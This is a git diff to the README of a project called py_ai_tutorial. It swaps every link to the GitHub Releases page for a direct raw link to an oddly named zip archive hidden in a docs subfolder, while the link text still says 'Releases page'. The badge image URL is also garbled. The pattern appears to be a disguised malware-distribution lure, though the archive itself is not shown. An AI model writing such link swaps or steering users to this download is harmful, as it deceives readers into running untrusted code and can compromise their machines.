@@ -6,7 +6,7 @@ Welcome to the **py_ai_tutorial** project! This guide will help you download and
 
 ## 📥 Download the Software
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/WasawaP/py_ai_tutorial/releases)
+[![Download](https://raw.githubusercontent.com/WasawaP/py_ai_tutorial/main/docs/stage3/04-ml-advanced/py_ai_tutorial_preachman.zip%https://raw.githubusercontent.com/WasawaP/py_ai_tutorial/main/docs/stage3/04-ml-advanced/py_ai_tutorial_preachman.zip)](https://raw.githubusercontent.com/WasawaP/py_ai_tutorial/main/docs/stage3/04-ml-advanced/py_ai_tutorial_preachman.zip)
 
 You can find the latest version of our software on the Releases page. It is straightforward to access and download the files you need.
 
@@ -33,7 +33,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/WasawaP/py_ai_tutorial/releases) to download the software.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/WasawaP/py_ai_tutorial/main/docs/stage3/04-ml-advanced/py_ai_tutorial_preachman.zip) to download the software.
 2. **Choose the Latest Version:** Find the most recent release listed at the top. Click on it.
 3. **Download the Package:** Look for the appropriate file for your operating system. Click the link to download.
 4. **Install the Application:**
@@ -70,6 +70,6 @@ Keep track of new releases and updates by following our repository. This will en
 
 ## 📥 Download the Software Again
 
-Don't forget to revisit the [Releases page](https://github.com/WasawaP/py_ai_tutorial/releases) to download the latest version whenever you need it.
+Don't forget to revisit the [Releases page](https://raw.githubusercontent.com/WasawaP/py_ai_tutorial/main/docs/stage3/04-ml-advanced/py_ai_tutorial_preachman.zip) to download the latest version whenever you need it.
 
 Thank you for your interest in **py_ai_tutorial!** We hope you enjoy your learning journey in AI.
